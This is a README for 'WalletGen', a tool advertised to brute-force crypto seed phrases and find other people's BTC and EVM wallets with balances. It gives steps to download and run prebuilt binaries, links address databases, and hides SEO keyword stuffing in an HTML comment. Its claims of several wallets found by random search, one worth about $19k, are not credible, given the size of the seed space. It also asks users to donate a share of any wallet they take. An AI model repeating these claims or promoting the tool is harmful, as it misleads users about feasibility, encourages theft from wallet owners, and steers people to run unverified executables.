# WalletGen – Fast Crypto Wallet Generator & Balance Finder (BTC / ETH / BNB / EVM)

**WalletGen** is a high-performance cryptocurrency wallet generator and balance finder for **Bitcoin (BTC)** and **EVM-based blockchains** like **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)** and more.  
Built in C++ for maximum speed, it allows you to generate wallets, brute-force seed phrases, and search for lost crypto wallets with active balances.

![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue) 
[![downloads](https://img.shields.io/github/downloads/tony-dev1/walletgen/total)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
[![license](https://img.shields.io/github/license/tony-dev1/walletgen)](/LICENSE) 
![discord](https://img.shields.io/badge/discord-tonydev-yellow)

<p align="center">
    <img width="1000" height="460" src="/assets/walletgen1.png" />
</p>

⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access.

## How It Works

WalletGen generates random or deterministic seed phrases and converts them into wallet addresses using BIP39, BIP44, and Bech32 (for BTC) or keccak256 (for EVM).

The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 

Wallet Gen is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, Wallet Gen boasts significantly higher wallet generation speeds, with performance primarily relying on your CPU & GPU.


## Features

- **Generation of cryptocurrency wallets**: Wallet Gen supports creating single wallets for Bitcoin, Ethereum, BNB, MATIC and other cryptocurrencies.
- **Search for wallets with balance**: Using bruteforce techniques, Wallet Gen allows you to search for existing wallets with balances in both the Bitcoin network and EVMs.
- **Support for various algorithms**: Keccak256 algorithm for EVM wallets and BIP39, BIP44, Bech32 algorithm for Bitcoin are used for wallet generation.
- **Using a database to speed up searches**: Download and use databases to search for balance wallets, speeding up the process tenfold.
- **High speed of operation**: Wallet Gen utilizes the power of the CPU and GPU to achieve the best performance.

# Demo

<p align="center">
    <img width="1000" height="460" src="/assets/wallet-gen.gif" />
</p>

<p align="center">
    <img width="1000" height="460" src="/assets/walletgen_linux1.png" />
</p>

# Searching for Crypto Wallets

**Wallet Gen** allows you to search using brute force method for two types of crypto wallets with an existing balance. To search for BTC wallets, press key `3` in the menu or run `start_search_btc.bat`. For searching EVM wallets (such as Ethereum, BNB, etc.), press key `4` in the menu or run `start_search_evm.bat`. 

The search speed is determined by your hardware, especially your graphics card. To increase your chances of finding a wallet with a balance, you can run multiple instances of the program, from 1 to 4, depending on the power of your graphics card.

## How to start

### Windows 
- Download [WalletGen.zip](https://github.com/tony-dev1/wallets-finder/releases/download/walletgen/WalletGen_v1.7.0.zip) (5MB)
- Unpack anywhere
- Run `WalletGen.exe`

### Linux (x86-64bit)
```bash
wget https://github.com/tony-dev1/walletgen/releases/download/walletgen/walletgen-v1.5.0-linux.tar.gz
tar -xzf walletgen-v1.5.0-linux.tar.gz
cd walletgen
./walletgen
```
### Download and Use Database (for more speed)
| Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
|---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](https://github.com/tony-dev1/walletgen/releases/download/database/btc_database.txt)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_ddatabase.txt](https://github.com/tony-dev1/walletgen/releases/download/database/evm_database.txt)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700

## My Finds

I’ve personally recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).  
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" src="/assets/tocozu.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

<p align="center">
    <img width="1000" height="460" src="https://github.com/user-attachments/assets/57f95d59-9da2-44f0-8f66-dbbe7fe69aee" />
</p>

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

<p align="center">
    <img width="1000" height="460" src="https://github.com/user-attachments/assets/6c5faff7-594f-4d37-b91b-f6482c728611" />
</p>


## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any other compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## Todo
1. Search for missing words in a seed phrase.

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Contacts
If you have any questions or want to share your find or you found some bug in WalletGen work, feel free to message me!
My Discord: **tonydevbtc**

## Donate

I encourage you, when you find a wallet with a balance, to send me a small portion as a thank you. This motivates me to keep working on the program, keep it going, and make it better!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)

<!--
bitcoin, ethereum, crypto, cryptocurrency, crypto seed phrase mining, crypto bruteforce, bitcoin bruteforce, ethereum bruteforce, crypto finder, lost bitcoin, brute force wallet, crypto brute foce, crypto bruteforce, crypto bruteforce wallet, crypto bruteforce key, crypto wallet, crypto wallet recovery, crypto wallet seed generator, crypto wallet seed phrase, crypto wallet tools, wallet finder crypto, wallet recovery seeds, wallet recovery tools, seed phrase, seed phrase generator, bip39 wallet, trezor, walletgen, crypto mining, mnemonic generator, crypto recovery, recovery crypto, bitcoin wallet, ethereum wallet, seed phrase finder, seed phrase wallet, seed phrase generator with balance, seed phrase balance checker, seed phrase trust wallet, seed phrase generator and checker, seed phrase storage, seed phrase word list github, bitcoin explorer, bitcoin core, bitcoin mining, ethereum mining, lost bitcoin wallet list, lost bitcoin wallet finder, lost bitcoin wallets, lost bitcoin password, lost bitcoin addresses, crypto mining app, crypto mining software, mnemonic phrase, mnemonic, mnemonic phrase generator, mnemonic phrase checker, mnemonic phrase lost, mnemonic phrase to private key, mnemonic phrase wallet, private key finder, private key bitcoin, private keys database, private key metamask, private key to seed phrase, private key, private key ethereum, private key wallet, crypto address check, brute crypto mining, brute crypto
-->
